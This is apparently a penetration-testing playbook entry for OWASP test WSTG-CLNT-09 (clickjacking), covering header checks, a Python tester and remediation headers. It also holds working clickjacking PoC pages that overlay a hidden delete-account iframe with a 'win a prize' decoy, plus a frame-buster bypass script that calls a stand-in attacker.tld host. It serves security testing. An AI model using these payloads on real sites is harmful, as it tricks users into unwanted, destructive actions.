---
name: wstg-clnt-09
description: "Testing for Clickjacking"
category: client-side
owasp_id: WSTG-CLNT-09
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-922]
chains_with: [wstg-clnt-01, wstg-clnt-01.1]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-01: "Clickjacking overlay + a DOM XSS sink that only fires on a click (e.g., an injected onclick handler) = attacker frames the page and tricks the victim into unknowingly clicking the trigger element, reliably delivering the XSS payload without a suspicious link (Medium -> High)"
---

# wstg-clnt-09

## Test ID

WSTG-CLNT-09

## Test Name

Testing for Clickjacking

## High-Level Description

Clickjacking (UI redressing) tricks users into clicking hidden elements by overlaying transparent frames over legitimate UI. Attackers can make users unknowingly perform actions like changing settings, making purchases, or granting permissions.

---

## What to Check

- [ ] X-Frame-Options header
- [ ] Content-Security-Policy frame-ancestors
- [ ] JavaScript frame-busting code
- [ ] Sensitive actions without confirmation
- [ ] iframe embedding allowed

---

## How to Test

### Step 1: Check Headers

```bash
#!/bin/bash
TARGET="https://target.com"

# Check framing protection headers
curl -sI "$TARGET" | grep -iE "x-frame-options|content-security-policy"

# X-Frame-Options values:
# DENY - Cannot be framed
# SAMEORIGIN - Only same origin can frame
# ALLOW-FROM uri - Specific origin (deprecated)

# CSP frame-ancestors:
# frame-ancestors 'self' - Only same origin
# frame-ancestors 'none' - Cannot be framed
```

### Step 2: Clickjacking PoC

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Clickjacking PoC</title>
    <style>
      #target {
        position: absolute;
        width: 500px;
        height: 400px;
        opacity: 0.1; /* Nearly invisible */
        z-index: 2;
      }
      #decoy {
        position: absolute;
        width: 500px;
        height: 400px;
        z-index: 1;
      }
      #decoy button {
        position: absolute;
        top: 200px;
        left: 150px;
        padding: 20px 40px;
        font-size: 20px;
      }
    </style>
  </head>
  <body>
    <h1>Click to win a prize!</h1>

    <!-- Decoy content -->
    <div id="decoy">
      <button>CLICK HERE TO WIN!</button>
    </div>

    <!-- Hidden iframe with target action -->
    <iframe id="target" src="https://target.com/settings/delete-account"></iframe>
  </body>
</html>
```

### Step 3: Clickjacking Tester

```python
#!/usr/bin/env python3
import requests

class ClickjackingTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test_framing_protection(self):
        """Test for clickjacking protection"""
        print(f"[*] Testing clickjacking protection: {self.url}")

        response = requests.get(self.url)

        # Check X-Frame-Options
        xfo = response.headers.get('X-Frame-Options', '').upper()
        csp = response.headers.get('Content-Security-Policy', '')

        # Parse frame-ancestors from CSP
        frame_ancestors = ''
        if 'frame-ancestors' in csp:
            import re
            match = re.search(r"frame-ancestors\s+([^;]+)", csp)
            if match:
                frame_ancestors = match.group(1)

        print(f"  X-Frame-Options: {xfo or 'Not set'}")
        print(f"  CSP frame-ancestors: {frame_ancestors or 'Not set'}")

        if not xfo and not frame_ancestors:
            print("[VULN] No framing protection!")
            self.findings.append({
                "issue": "No clickjacking protection",
                "severity": "Medium"
            })
        elif xfo == 'ALLOW-FROM':
            print("[WARN] ALLOW-FROM is deprecated")

        # Check for JavaScript frame-busting
        if 'top.location' in response.text or 'self !== top' in response.text:
            print("[INFO] JavaScript frame-busting present (can be bypassed)")

    def generate_poc(self):
        """Generate clickjacking PoC"""
        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.3;
        }}
    </style>
</head>
<body>
    <h1>Clickjacking Test</h1>
    <iframe src="{self.url}"></iframe>
</body>
</html>'''
        return poc

# Usage
tester = ClickjackingTester("https://target.com/settings")
tester.test_framing_protection()
print("\nPoC HTML:")
print(tester.generate_poc())
```

---

## Tools

| Tool               | Purpose                                          |
| ------------------- | --------------------------------------------------- |
| **Burp Suite**       | "Engagement tools > Generate CSRF/Clickjacking PoC"  |
| **Clickjacking PoC generator (PortSwigger)** | Auto-build the iframe overlay HTML |
| **Browser DevTools** | Verify X-Frame-Options / CSP frame-ancestors headers |

---

## Example Commands/Payloads

### Header check

```bash
curl -sI "https://{target}" | grep -iE "x-frame-options|content-security-policy"
```

### Minimal clickjacking PoC

```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title>
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.0001; z-index:2; }
  #decoy { position:absolute; top:0; left:0; z-index:1; }
</style>
</head>
<body>
  <div id="decoy"><button style="position:absolute;top:200px;left:150px;">Click to win!</button></div>
  <iframe src="https://{target}/settings/delete-account"></iframe>
</body>
</html>
```

### drag-and-drop / scroll variant (bypasses simple overlay defenses)

```html
<iframe src="https://{target}/account" style="opacity:0.0001;position:absolute;width:1500px;height:1500px;top:-1200px;left:-100px;"></iframe>
```

### `onbeforeunload` bypass for legacy JavaScript frame-busting code

If `{target}` still relies on a client-side `if (top != self) top.location = self.location` buster instead of headers, an attacker can neutralize it by repeatedly cancelling the resulting top-level navigation:

```html
<!-- 204.php on attacker.tld: header("HTTP/1.1 204 No Content"); -->
<script>
  var prevent_bust = 0
  window.onbeforeunload = function () {
    prevent_bust++
  }
  setInterval(function () {
    if (prevent_bust > 0) {
      prevent_bust -= 2
      window.top.location = "https://attacker.tld/204.php"
    }
  }, 1)
</script>
<iframe src="https://{target}/settings"></iframe>
```

### IE8/legacy XSS-filter frame-buster disabling (historical, verify if still applicable to target stack)

Older browser XSS filters would silently disable an inline script (including the frame-busting one) if a substring of it appeared reflected in a request parameter — confirm the buster script is not reachable this way:

```
https://{target}/?param=<script>if
```

---

## Remediation

```python
# Add X-Frame-Options header
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    # Or use CSP (more flexible)
    response.headers['Content-Security-Policy'] = "frame-ancestors 'self'"
    return response
```

```nginx
# Nginx configuration
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```

---

## Risk Assessment

| Finding                                 | CVSS | Severity |
| --------------------------------------- | ---- | -------- |
| No framing protection on sensitive page | 4.3  | Medium   |
| ALLOW-FROM (deprecated)                 | 3.5  | Low      |

---

## CWE Categories

| CWE ID       | Title                                      |
| ------------ | ------------------------------------------ |
| **CWE-1021** | Improper Restriction of Rendered UI Layers |


---

## References

- [OWASP WSTG - Testing for Clickjacking (WSTG-CLNT-09)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)
- [PayloadsAllTheThings - Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

## Checklist

```
[ ] X-Frame-Options checked
[ ] CSP frame-ancestors checked
[ ] JavaScript frame-busting analyzed
[ ] PoC created
[ ] Sensitive pages tested
[ ] Findings documented
```
